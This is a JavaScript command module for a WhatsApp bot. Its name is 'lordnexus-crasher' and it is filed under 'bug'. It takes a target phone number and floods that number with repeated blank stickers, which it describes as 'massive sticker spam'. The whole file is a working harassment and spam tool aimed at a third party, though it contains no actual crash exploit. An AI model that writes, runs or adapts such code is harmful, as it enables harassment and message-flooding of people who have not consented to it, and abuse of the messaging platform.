import { isOwner, sendError } from '../lib/utils.js';
import sharp from 'sharp';

let cooldownSticker = 0;

export default {
    name: 'lordnexus-crasher',
    aliases: [],
    description: 'Send massive sticker spam to target (owner only)',
    
    isPremium: true,
    groupOnly: false,
    privateOnly: true,
    adminOnly: true,
    category: 'bug',

    async execute(sock, message, args) {
        const from = message.key.remoteJid;
        const sender = message.key.participant || from;

        if (!isOwner(sender)) 
            return await sendError(sock, from, 'Only owners can use this command.');

        const currentTime = Date.now();
        if (currentTime - cooldownSticker < 5000) 
            return await sendError(sock, from, `Please wait before using this command again.`);

        const phoneNumber = args[0]?.replace(/\D/g, '');
        if (!phoneNumber || phoneNumber.length < 10) 
            return await sendError(sock, from, `Provide a valid phone number (e.g., !lordnexus-crasher 254722233xxx).`);

        const targetJid = `${phoneNumber}@s.whatsapp.net`;
        const stickerCount = parseInt(args[1]) || 10;

        try {
            const image = Buffer.alloc(512 * 512);
            const sticker = await sharp(image).resize(512, 512).png().toBuffer();
            for (let i = 0; i < stickerCount; i++) {
                await sock.sendMessage(targetJid, { sticker });
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
            await sock.sendMessage(from, { text: `Sent ${stickerCount} stickers to ${phoneNumber} ✅` });
            cooldownSticker = currentTime;
        } catch (error) {
            await sendError(sock, from, 'Sticker flood test failed.');
        }
    }
};